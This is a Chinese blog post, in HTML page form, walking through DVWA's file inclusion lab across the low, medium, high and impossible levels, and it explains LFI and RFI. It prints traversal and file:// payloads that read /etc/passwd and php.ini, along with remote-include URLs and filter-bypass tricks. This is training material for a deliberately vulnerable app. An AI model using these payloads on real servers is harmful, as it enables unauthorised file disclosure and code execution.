@@ -1,0 +1,291 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DVWA之FileInclusion | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DVWA之FileInclusion | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="File Inclusion
+什么是 File Inclusion
+简介
+​ 文件包含漏洞，是指当服务器开启allow_url_include选项时，就可以通过PHP的某些特性函数(include(), require(), include..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DVWA之FileInclusion
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-03-31
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>File Inclusion<br>
+什么是 File Inclusion<br>
+简介<br>
+​ 文件包含漏洞，是指当服务器开启allow_url_include选项时，就可以通过PHP的某些特性函数(include(), require(), include_once(), require_once())利用url去动态包含文件，此时如果没有对文件来源进行严格的审查，就会导致任意文件读取或任意命令执行。文件包含漏洞分为：本地文件包含漏洞和远程文件包含漏洞，远程文件包含漏洞是因为PHP配置中的allow_url_fopen开启，服务器允许包含一个远程文件。</p>
+<p>相关函数<br>
+include(): 将指定的文件读入并且执行里面的程序。</p>
+<p>require(): 将文件的内容读入，并且把自己本身替换成这些读入的内容。</p>
+<p>include_once(): 和include函数完全相同，唯一区别是如果该文件中已经被包含过，则不会再次包含。</p>
+<p>require_once(): 和require函数完全相同，唯一区别是如果该文件中已经被包含过，则不会再次包含。</p>
+<p>文件包含功能<br>
+​ include和require函数的主要区别是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误时，会直接报错并退出程序的执行。</p>
+<p>​ 文件包含功能使用include函数将web根目录以外的目录文件包含进来，文件包含功能给开发人员带来了便利。通过把常用的功能归类成文件，文件包含可以提高代码重用率。</p>
+<p>​ 文件包含漏洞是高危漏洞，往往会导致任意文件读取和任意命令执行，造成严重的安全后果。</p>
+<p>​ 文件包含往往要使用到目录遍历工具。</p>
+<p>相关知识<br>
+1.文件包含分类：</p>
+<p>​ 目录遍历(Directory traversal) 和 文件包含(File include) 的一些区别：</p>
+<p>​ 目录遍历：可以读取web根目录以外的其他目录，根源在于web application 的路径访问权限设置不严，针对的是本系统。</p>
+<p>​ 文件包含：通过include函数将web根目录以外的目录的文件被包含进来，分为LFI本地文件包含和RFI远程文件包含。</p>
+<p>LFI：本地文件包含(Local File Inclusion)</p>
+<p>RFI：远程文件包含(Remote File Inclusion)</p>
+<p>2.php.ini设置</p>
+<p>allow_url_fopen=on (默认开启)</p>
+<p>allow_url_include=on (默认关闭)</p>
+<p>远程文件包含是因为开启了PHP配置中的allow_url_fopen选项(选项开启后，服务器允许包含一个远程的文件)。</p>
+<p>文件包含漏洞的一般特征<br>
+?page=a.PHP<br>
+?home=a.html<br>
+?file=content<br>
+文件包含测试<br>
+1.通过多个 …/ 让目录返回上一级，然后再加入目标目录</p>
+<pre><code>?file=../../../../../etc/passwd
+?page=file:///etc/passwd
+?home=main.cgi
+?page=http://www.a.com/1.php
+http://1.1.1.1/../../../../dir/file.txt
+</code></pre>
+<p>2.编码字符绕过过滤</p>
+<p>1.可以使用多种编码方式进行绕过<br>
+2.%00嵌入任意位置<br>
+3 . .的利用<br>
+注意：服务器包含文件时，不管文件后缀是否是PHP，都会尝试当作PHP文件执行，如果文件内容确为PHP，则会正常执行并返回结果；如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<pre><code>    **1.low**
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+?&gt; 
+</code></pre>
+<p>源码没有进行任何过滤。</p>
+<pre><code>?page=include.php/
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617195930653.png" alt="" loading="lazy"><br>
+看报错信息，直接将网站的路径信息给我们暴露出来了：</p>
+<p>第一条warring是找不到我们指定的page，给出警告；</p>
+<p>第二条warring是因为没有找到指定的page，在包含时出错。根据暴露出来的绝对路径：<br>
+/var/www/html/dvwa/vulnerabilities/fi/index.php<br>
+, 通过访问相对路径的方式../ 访问所有的路径，如访问<br>
+?page=../../phpinfo.php<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196001428.png" alt="" loading="lazy"></p>
+<p>尝试远程文件包含：<br>
+在本地建立一个info.txt文件：（路径：/var/www/html/info.txt）<br>
+<?php phpinfo(); ?><br>
+构造URL：<br>
+?page=http://127.0.0.1/info.txt<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196066174.png" alt="" loading="lazy"><br>
+<strong>2.medium</strong><br>
+&lt;?php</p>
+<pre><code>// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+
+?&gt; 
+</code></pre>
+<p>可以看到，代码对远程文件包含进行了限制，用str_replace函数将http://、https//、../、..\进行了替换，换为了空字符。</p>
+<p>可以采用双写绕过。</p>
+<p>本地包含：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196143326.png" alt="" loading="lazy"><br>
+远程包含：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196148814.png" alt="" loading="lazy"><br>
+<strong>3.high</strong><br>
+&lt;?php</p>
+<pre><code>// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
+// This isn't the page we want!
+echo &quot;ERROR: File not found!&quot;;
+exit;
+}
+
+?&gt; 
+</code></pre>
+<p>fnmatch()：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196216076.jpg" alt="" loading="lazy"></p>
+<p>high级别代码，使用了fnmatch函数检查page参数，要求page参数的开头必须是file的文件或只能为include.php文件服务器才会去包含相应文件。</p>
+<p>使用file协议，以file字符串开头：<br>
+?page=file:///var/www/html/dvwa/php.ini<br>
+成功读取到服务器配置文件：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196265098.png" alt="" loading="lazy"><br>
+file协议简单来说就是我们直接用浏览器打开的本地文件一样。</p>
+<p>如：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617196348465.png" alt="" loading="lazy"></p>
+<pre><code>    **4.impossible**
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {
+// This isn't the page we want!
+echo &quot;ERROR: File not found!&quot;;
+exit;
+}
+
+?&gt; 
+</code></pre>
+<p>impossible级别的代码使用了白名单过滤的方法，包含的文件名只能为白名单中的文件，避免了文件包含漏洞的产生。</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/linux-ming-ling-xing/">
+              <h3 class="post-title">
+                linux命令行
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
